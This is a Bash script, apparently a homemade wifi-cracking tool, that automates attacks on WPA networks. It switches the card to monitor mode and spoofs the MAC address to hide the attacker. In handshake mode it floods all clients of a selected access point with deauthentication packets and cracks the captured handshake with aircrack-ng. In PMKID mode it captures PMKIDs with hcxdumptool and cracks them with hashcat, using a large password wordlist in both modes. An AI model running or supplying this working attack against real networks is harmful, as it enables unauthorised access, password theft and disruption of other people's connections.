#!/usr/bin/bash

trap ctrl_c INT

# Colours and uses

red='\033[0;31m' # Something went wrong
green='\033[0;32m' # Something went well
yellow='\033[0;33m' # Warning
blue='\033[0;34m' # Info
purple='\033[0;35m' # When asking something to the user
cyan='\033[0;36m' # Something is happening
grey='\033[0;37m' # Show a command to the user
nc='\033[0m' # No Color

wrong=${red}
good=${green}
warn=${yellow}
info=${blue}
ask=${purple}
doing=${cyan}
cmd=${grey}

function enable_managed_mode(){
    echo -e "\n${doing}[~]${nc} Taking network card to managed mode..."
    sleep 0.5
    airmon-ng stop ${network_card} &>/dev/null
    echo -e "${good}[+]${nc} Network card is now in managed mode."
    echo -e "\n${doing}[~]${nc} Restarting network manager..."
    sleep 0.5
    service network-manager restart &>/dev/null
    service NetworkManager restart &>/dev/null
    service wpa_supplicant restart &>/dev/null
    echo -e "${good}[+]${nc} Network manager restarted."
}

function anonymize_mac_address(){
    echo -e "\n${doing}[~]${nc} Anonymizing MAC address"; sleep 0.5
    ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
    ifconfig ${network_card} up &>/dev/null
    macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
    echo -e "\n${good}[+]${nc} New MAC address: $macaddress"; sleep 0.5
}

function enable_monitor_mode(){
    echo -e "\n${doing}[~]${nc} Taking network card to monitor mode"
    airmon-ng start $network_card &>/dev/null
    ifconfig ${network_card}mon &>/dev/null
    if [ "$(echo $?)" == "0" ]; then
        network_card="${network_card}mon"
    fi

    echo -e "\n${good}[+]${nc} Network card in monitor mode"; sleep 0.5
    anonymize_mac_address
    echo -e "\n${doing}[~]${nc} Killing processes that could interfer"; sleep 0.5
    killall wpa_supplicant dhclient 2>/dev/null
    airmon-ng check kill &>/dev/null
    echo -e "\n${good}[+]${nc} Processes killed correctly"; sleep 0.5
}

function kill_remaining_processes(){
    kill -9 $(ps aux | grep -i "airodump-ng" | awk '{print $2}') &>/dev/null
    kill -9 $(ps aux | grep -i "aireplay-ng" | awk '{print $2}') &>/dev/null
    kill -9 $(ps aux | grep -i "hcxdumptool" | awk '{print $2}') &>/dev/null
}

function exit_script(){
    if [ "$we_attack" = "0" ]; then
        echo -e "\n${warn}[*]${nc} We are gonna to exit the script..."
        echo -e "\n${info}[·]${nc} Managed mode allows you to navigate into internet and that stuff. If had finished your attacks it's likeable to bring the network back to managed mode."
        echo -e "\n${info}[·]${nc} If you are cracking some password bring the network card to managed mode, doesn't affect on anything."
        echo -ne "\n${ask}[?]${nc} Do you want to bring the network back to managed mode? [y/n]: "
        read answer
        if [ "${answer,,}" = "y" ]; then
            enable_managed_mode
        else
            echo -e "\n${yellow}[!]${nc} Leaving network card in monitor mode..."
        fi
        echo -e "\n${info}[·]${nc} I specially recommend you to kill the remaining processes if you use a PMKID attack, because I found that hcxdumptool doesn't kill itself for some reason..."
        echo -e "\n${info}[·]${nc} You could also verify this with the command: ${cmd}ps aux | grep -i \"hcxdumptool\"${nc}"
        echo -ne "\n${ask}[?]${nc} Do you want to kill remaining processes?[y/n]: "
        read answer
        if [ "${answer,,}" = "y" ]; then
            kill_remaining_processes
        else
            echo -e "\n${yellow}[!]${nc} Leaving remaining processes running..."
        fi
    fi
    echo -e "\n${good}[+]${nc} Exiting..."
    tput cnorm; exit 0
}

function ctrl_c(){
    exit_script
}

function help_panel(){
    echo -e "Usage: ${good}$0 ${info}-a attack_mode"
    echo -e "\ta) Attack mode"
    echo -e "\t${nc}Available attack modes:"
    echo -e "\t\t${info}PMKID"
    echo -e "\t\tHandshake"
    echo -e "\t${info}n) Change network card mode"
    echo -e "\t${nc}Available network card modes:"
    echo -e "\t\t${info}managed"
    echo -e "\t\tmonitor"
    echo -e "\t${doing}h) Help panel"
    echo -e "\tShow this help panel"
    echo -e "\n\t${cmd}Example: $0 -a PMKID${nc}"

    exit_script
}

function check_installer_manager(){
    confirmation="y"
    managers=(apt-get apt yum dnf zypper pacman emerge urpmi flatpak snap snapd pkg)
    available_managers=()
    for manager in "${managers[@]}"; do
        if command -v $manager &> /dev/null; then
            available_managers+=($manager)
        fi
    done
    if [ "${#available_managers[@]}" -eq "0" ]; then
        echo -e "\n${warn}[!]${nc} No package manager found"
    else
        if [ "${#available_managers[@]}" -eq "1" ]; then
            package_manager=${available_managers[0]}
        else
            echo -e "\n${warn}[!]${nc} More than one package manager found"
            echo -e "\n${info}[·]${nc} Available package managers:"
            PS3="[?] Select a package manager: "
            select installer in "${available_managers[@]}"; do
                if [ -n "$installer" ]; then
                    package_manager=$installer
                    break
                fi
            done
        fi
    fi
}

function install_hcxdumptool(){
    echo -e "${doing}[~]${nc} Installing hcxdumptool..."
    sleep 0.5
    if [[ $package_manager == "apt" ]]; then
        apt install -y libcurl4-openssl-dev libssl-dev pkg-config &>/dev/null
    fi
    git clone https://github.com/ZerBea/hcxdumptool.git &>/dev/null
    cd hcxdumptool
    make 1>/dev/null
    make install 1>/dev/null
    cd ..
    rm -rf hcxdumptool &>/dev/null
    if command -v hcxdumptool &>/dev/null ; then
        installed_programs+=($program)
    fi
}

function check_kaonashi(){
    if [[ ! -f /usr/share/wordlists/kaonashiWPA100M.txt ]]; then
        echo -e "${info}[·]${nc} kaonashi is not in the system"
		echo -e "${info}[·]${nc} Downloading kaonashi .torrent file to the current directory"
        echo -e "${info}[·]${nc} Please, download the torrent and extract the file to /usr/share/wordlists/"
        echo -e "${info}[·]${nc} After that, run the script again"
        mkdir -p /usr/share/wordlists/
        wget https://github.com/kaonashi-passwords/Kaonashi/blob/master/wordlists/kaonashiWPA100M.7z.torrent &>/dev/null
        sleep 0.5
    else
        echo -e "${good}[+]${nc} kaonashi found"
        sleep 0.5
    fi
}

function install_all_missing_dependencies(){
    $package_manager &> /dev/null
    for program in "${missing_dependencies[@]}"; do
        if [[ $program == "hcxdumptool" ]] && [[ $package_manager != "pacman" ]]; then
            install_hcxdumptool
        elif [[ $program == "hcxdumptool" ]] && [[ $package_manager == "pacman" ]]; then
            $package_manager install -Sy $program &> /dev/null
        fi
        if [ "$(echo $?)" == "0" ]; then
            echo -e "\n${doing}[~]${nc} Installing $program with $package_manager"
            sleep 2
            echo -e "${cmd}$ sudo $package_manager install $program${nc}"
            sudo $package_manager install $program -${confirmation} 1>/dev/null
            if [ "$(echo $?)" == "0" ]; then
                echo -e "${good}[+]${nc} $program has been installed"
                installed_programs+=($program)
            else
                echo -e "${wrong}[-]${nc} $program could not be installed with $installer. Please, install it manually"
            fi
        else
            echo -e "${wrong}[-]${nc} Could not install $program because I could not find a package manager on your system. Please, install it manually"
    fi
    done
}

function see_all_dependencies(){
    echo -e "${info}[~]${nc} For handshakes attack:"
    echo -e "\t${info}[~]${nc} aircrack-ng -> For listing the networks and capturing the handshake"
    echo -e "\t${info}[~]${nc} tshark -> For reading the handshake file and verify it"
    echo -e "${info}[~]${nc} For PMKID attack:"
    echo -e "\t${info}[~]${nc} hcxdumptool -> For capturing the PMKID"
    echo -e "\t${info}[~]${nc} hashcat -> For cracking the PMKID"
    echo -e "${info}[~]${nc} For all the attacks"
    echo -e "\t${info}[~]${nc} macchanger -> For changing your MAC address and annonymize yourself"
    echo -e "\t${info}[~]${nc} kaonashi -> For cracking the handshakes and PMKID"
    exit_script
}

function dependencies(){
    #clear;
    programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)

    echo -e "${doing}[~]${nc} Checking dependencies...\n"
    sleep 0.5

    installed_programs=()
    missing_dependencies=()

    for program in "${programs[@]}"; do
        if ! command -v $program &> /dev/null; then
            echo -e "${yellow}[*] ${nc}$program could not be found"
            missing_dependencies+=($program)
        else
            echo -e "${good}[+]${nc} $program found"
            sleep 0.5
            installed_programs+=($program)
        fi
    done

    check_kaonashi

    if [ ${#missing_dependencies} -gt 0 ]; then
        echo -e "\n${blue}[·]${nc} My recommendation is to install them but by yourself, you never know who make the package you are installing..."
        echo -e "${blue}[·]${nc} If you want to install them by yourself, just press n, install the dependencies and later run the script again (Make sure that the dependencies are somewhere on your path)"
        echo -e "${blue}[·]${nc} If you are not so paranoid, just press y and let me install them for you"
        echo -ne "\n${purple}[?]${nc} Do you want to install the missing dependencies? [y/n]: "
        read confirmation
        if [[ ${confirmation,,} == "y" ]]; then
            check_installer_manager
            install_all_missing_dependencies
        else
            echo -e "${green}[+]${nc} Ok, I will not install the missing dependencies"
            echo -e "${green}[+]${nc} Great for you! You are so paranoid that you do not trust me to install the missing dependencies for you, but no so paranoid to run this script with sudo xD"
            sleep 0.5
        fi
    fi
    programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)
    if [ ${#installed_programs} -eq ${#programs} ]; then
        echo -e "\n${good}[+]${nc} All dependencies are installed"
        sleep 1
    else
        echo -e "\n${warn}[*]${nc} Some dependencies are not installed"
        for dependency in "${missing_dependencies[@]}"; do
            echo -e "${warn}[*]${nc} $dependency is not installed"
        done
        echo -e "${info}[~]${nc} Please, install them manually and run the script again"
        see_all_dependencies
        sleep 1
        exit_script
    fi
}

function select_target_network(){
    echo -e "\n${yellow}[*]${nc} Now we are going to scan the networks around you..."
    echo -e "${yellow}[*]${nc} A new terminal will be opened to show you the networks around you"
    sleep 1

    xterm -hold -e "airodump-ng ${network_card} -w airodump-dump --write-interval 1 --output-format csv"&
    airodump_xterm_pid=$!

    echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it when you press ${good}enter${nc}"
    echo -e "${yellow}[*]${nc} Wait a few seconds and pause the scan with ${good}enter${nc}..."
    wait_for_confirmation
    kill -9 $airodump_xterm_pid; wait $airodump_xterm_pid &>/dev/null ; sleep 2

    sed -i '1,2d' airodump-dump-01.csv
    sed -i '1,/Station MAC/!d' airodump-dump-01.csv

    networks="|······BSSID······|········ESSID·······|CHANNEL|POWER|SECURITY|,"
    while IFS=, read -r bssid first_time last_time channel speed privacy cipher authentication power beacons iv lan_ip id_length essid key; do
        if [[ $privacy != " OPN" ]]; then
            dots="····················"
            essid=$(echo $essid | sed 's/\"//g' | sed 's/,//g' | sed 's/ //g')
            essid="${essid}${dots}"
            channel="$(echo $channel | sed 's/ //g')"
            channel="${channel}${dots}"
            power="$((power + 100))"
            power="${power} %${dots}"
            privacy="$(echo $privacy | sed 's/ //g')"
            privacy="${privacy}${dots}"
            networks="${networks}|${bssid}|${essid::20}|${channel::7}|${power::5}|${privacy::8}|,"
        fi
    done < airodump-dump-01.csv

    echo $networks > airodump-dump-01.parsed

    echo -e "\n${good}[+]${nc} Scanned networks"
    PS3="[?] Select the target network: "
    IFS=,
    select target_network in $(cat airodump-dump-01.parsed); do
        if [[ $target_network == "" ]]; then
            echo -e "${wrong}[-]${nc} Invalid option"
        else
            break
        fi
    done
    unset IFS
    ap_bssid=$(echo $target_network | cut -d'|' -f2 | sed 's/·//g')
    ap_channel=$(echo $target_network | cut -d'|' -f4 | sed 's/ //g' | sed 's/·//g')
    ap_essid=$(echo $target_network | cut -d'|' -f3)
    echo -e "\n${good}[+]${nc} You choose ${yellow}${ap_bssid}${nc} on channel ${yellow}${ap_channel}${nc} with the name ${yellow}${ap_essid}${nc}"
    rm -rf airodump*
}

function handshake(){
    echo -e "\n${doing}[~]${nc} Listening network traffic of ${ap_bssid} on channel ${ap_channel}"
    sleep 0.5
    echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
    sleep 0.5
    echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it"
    sleep 0.5
    xterm -hold -e "airodump-ng -c $ap_channel -w "capture_${ap_bssid}" --bssid "${ap_bssid}" ${network_card}"&
    airodump_filter_xterm_pid=$!

    echo -e "\n${yellow}[*]${nc} A new terminal will be opened to send the deauth packets"
    sleep 0.5
    echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it"
    sleep 5
    echo -e "\n${doing}[~]${nc} Deauthenticating all clients..."; sleep 0.5
    xterm -hold -e "aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
    aireplay_xterm_pid=$!

    sleep 10; kill -9 $aireplay_xterm_pid; wait $aireplay_xterm_pid &>/dev/null
    echo -e "\n${green}[+]${nc} Signal for deauthenticate all clients sended"

    echo -e "\n${doing}[~]${nc} Waiting handshake for 60 seconds..."

    sleep 60 # Listen for 60 seconds

    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null

    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
        echo -e "\n${good}[+]${nc} Handshake captured"
        kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
    else
        echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
        echo -e "\n${yellow}[*]${nc} You could wait until the handshake is captured or press ${ask}enter${nc} to continue"
        echo -e "\n${info}[·]${nc} TIP: You can try to see the clients and send the deauth packets to them using aireplay in another terminal: "
        echo -e "${cmd}sudo aireplay-ng -0 5 -a ${ap_bssid} -c client_mac_address ${network_card}"
        echo -e "${cmd}sudo aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"
        wait_for_confirmation
        tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
        if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
            echo -e "\n${good}[+]${nc} Handshake captured"
            kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
        else
            echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
            kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
            echo -e "\n${wrong}[-]${nc} The failed captures will be deleted"
            rm -rf capture_*
            echo -ne "\n${ask}[?]${nc} Do you want to try again with the same network? [y/n]: " && read answer
            if [[ $answer == "y" ]]; then
                handshake
            fi
            echo -ne "\n${ask}[?]${nc} Do you want to try again with another network? [y/n]: " && read answer
            if [[ $answer == "y" ]]; then
                select_target_network
                handshake
            fi
        fi
    fi
    tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
        mkdir -p handshakes
        mv capture_* handshakes/

        xterm -hold -e "aircrack-ng -w /usr/share/wordlists/kaonashiWPA100M.txt handshakes/capture_${ap_bssid}-01.cap" &
        aircrack_xterm_pid=$!
        echo -e "\n${yellow}[*]${nc} Cracking handshake..."
        echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
        echo -e "\n${yellow}[!]${nc} Use the following command: ${cmd}sudo kill -9 $aircrack_xterm_pid${nc}"
    fi

    rm -rf handshake.txt

}

function pmkid(){
    echo -ne "\n${ask}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
    minutes=$(( $minutes * 60 ))
    echo -e "\n${doing}[~]${nc} Start listening at $(date +%H:%M:%S)..."
    xterm -hold -e "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" &
    hcxdumptool_xterm_pid=$!
    hcxdumptool_hang_process=$(ps aux | grep "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" | grep -v "xterm" | awk '{print $2}')
    sleep $minutes
    echo -e "\n${doing}[~]${nc} Stop listening at $(date +%H:%M:%S)..."
    kill -9 $hcxdumptool_xterm_pid &>/dev/null; wait $hcxdumptool_xterm_pid &>/dev/null
    sleep 5
    kill -9 $hcxdumptool_hang_process &>/dev/null; wait $hcxdumptool_hang_process &>/dev/null
    echo -e "\n${doing}[~]${nc} Obtaining hashes..."
    hash_name="hashes_pmkid_$(date +%y_%m_%d_%H_%M).hc22000"
    hcxpcapngtool -o ${hash_name} capture_pmkid 1>/dev/null
    rm -rf capture_pmkid &>/dev/null
    mkdir -p hashes_pmkid
    mv hashes_pmkid* hashes_pmkid &>/dev/null
    sleep 1

    test -f hashes_pmkid/${hash_name}

    if [ "$(echo $?)" == "0" ]; then
        echp -e "\n${good}[+]${nc} Hashes obtained"
        sleep 1
        echo -e "\n${doing}[~]${nc} Initiating brute-force attack..."
        sleep 1
        echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show the progress of the attack"
        xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlists/kaonashiWPA100M.txt" &
        hashcat_xterm_pid=$!
        echo -e "\n${yellow}[*]${nc} Remember to kill this terminal when the cracking were finished"
        echo -e "\n${info}[·]${nc} Use the following command: ${cmd}sudo kill -9 $hashcat_xterm_pid${nc}"
    else
        echo -e "\n${wrong}[!]${nc} The hashes are not captured :("

        echo -ne "\n${ask}[?]${nc} Do you want to retry? (y/n): "; read option

        if [ "${option,,}" == "yes" ] || [ "${option,,}" == "y" ]; then
            echo -e "\n${doing}[~]${nc} Retrying...\n"
            sleep 1
            pmkid
        fi
    fi
}

function attack(){
    #clear
    choose_card

    echo -e "${info}[·]${nc} Starting ${attack_mode} attack with $network_card network card"

    enable_monitor_mode

    if [[ "${attack_mode,,}" == "handshake" ]]; then
        select_target_network
        handshake
    elif [[ "${attack_mode,,}" == "pmkid" ]]; then
        pmkid
    else
        echo -e "${wrong}[-]${nc} Invalid attack mode"
        exit_script
    fi

}

function choose_card(){
    echo -e "\n${ask}[?]${nc} Choose a network card: "
    PS3="Network card: "
    select network_card in $(ifconfig | awk '{print $1}' | grep : | sed 's/://'); do
        if [[ -z $network_card ]]; then
            echo -e "\n${wrong}[-]${nc} Invalid option"
        else
            echo -e "\n${good}[+]${nc} You choose ${network_card}\n"
            break
            sleep 1
        fi
    done
    we_attack=0
}

function wait_for_confirmation(){
    echo -ne "\n${ask}[?]${nc} Press ${ask}enter${nc} to continue..." && read enter
    if [[ $enter != "" ]]; then
        exit_script
    fi
}
# Main function

tput civis
we_attack=1
echo ""
while getopts ":a:n:hd" arg; do
    case $arg in
        a) attack_mode=$OPTARG ;;
        n) network_card_mode=$OPTARG ;;
        d) see_all_dependencies ;;
        h) help_panel ;;
        ?) echo -e "${wrong}[!]${nc}Invalid option: -$OPTARG\n"; help_panel ;;
    esac
done

if [ "$(id -u)" == "0" ]; then

    if [[ $network_card_mode == "monitor" ]]; then
        choose_card
        enable_monitor_mode
        exit_script
    elif [[ $network_card_mode == "managed" ]]; then
        choose_card
        enable_managed_mode
        exit_script
    fi

    if [ -z "$attack_mode" ]; then
        echo -e "${wrong}[!]${nc}Missing arguments!\n"
        help_panel
    fi

    dependencies
    attack

    exit_script
else
    echo -e "${wrong}[!]${nc}You must be root to run this script"
    exit_script
fi

